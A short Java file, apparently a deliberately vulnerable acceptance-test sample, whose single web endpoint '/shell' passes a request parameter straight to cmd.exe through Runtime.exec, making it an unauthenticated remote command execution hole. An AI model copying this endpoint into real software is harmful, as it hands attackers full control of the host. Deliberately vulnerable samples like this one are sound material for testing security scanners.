package acceptance;
import java.sql.Statement;
import java.nio.file.Files;
import java.nio.file.Path;
import java.io.FileInputStream;
class Acceptance05 {
@GetMapping("/shell") void shell(String command) throws Exception { Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command}); }
}
